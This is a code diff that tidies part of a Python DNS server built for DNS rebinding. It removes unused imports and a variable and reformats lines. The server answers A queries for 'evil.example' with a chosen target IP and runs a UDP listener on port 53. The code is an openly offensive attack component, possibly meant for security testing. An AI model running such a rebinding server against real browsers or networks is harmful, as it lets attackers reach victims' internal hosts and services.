@@ -20,12 +20,10 @@ general-purpose DNS server.
 
 from __future__ import annotations
 
-import os
 import socket
 import struct
 import sys
 import threading
-import time
 from collections import defaultdict
 
 REBIND_DOMAIN = b"evil.example"
@@ -71,7 +69,6 @@ def _parse_name(data: bytes, offset: int) -> tuple[bytes, int]:
 def _build_response(query: bytes, source_ip: str) -> bytes:
     """Construct a DNS A response for the rebind domain (or NXDOMAIN otherwise)."""
     txn_id = query[0:2]
-    flags = struct.unpack(">H", query[2:4])[0]
     # Parse the question
     qname, qend = _parse_name(query, 12)
     qtype, qclass = struct.unpack(">HH", query[qend : qend + 4])
@@ -104,7 +101,7 @@ def _build_response(query: bytes, source_ip: str) -> bytes:
     name_ptr = struct.pack(">H", 0xC000 | 12)
     answer = (
         name_ptr
-        + struct.pack(">HHIH", 1, 1, TTL_SECONDS, 4)   # type=A, class=IN, TTL, rdlength=4
+        + struct.pack(">HHIH", 1, 1, TTL_SECONDS, 4)  # type=A, class=IN, TTL, rdlength=4
         + socket.inet_aton(target_ip)
     )
     return header + question_section + answer
@@ -115,9 +112,7 @@ def serve_udp(host: str = "0.0.0.0", port: int = 53) -> None:
     try:
         sock.bind((host, port))
     except PermissionError:
-        sys.stderr.write(
-            f"need CAP_NET_BIND_SERVICE or root to bind UDP/{port}; aborting\n"
-        )
+        sys.stderr.write(f"need CAP_NET_BIND_SERVICE or root to bind UDP/{port}; aborting\n")
         sys.exit(2)
     print(f"[dns] UDP listener on {host}:{port}", flush=True)
     print(
@@ -129,7 +124,7 @@ def serve_udp(host: str = "0.0.0.0", port: int = 53) -> None:
             data, addr = sock.recvfrom(512)
             response = _build_response(data, addr[0])
             sock.sendto(response, addr)
-        except Exception as e:                       # noqa: BLE001
+        except Exception as e:  # noqa: BLE001
             print(f"[dns] error: {e}", flush=True)
 
 
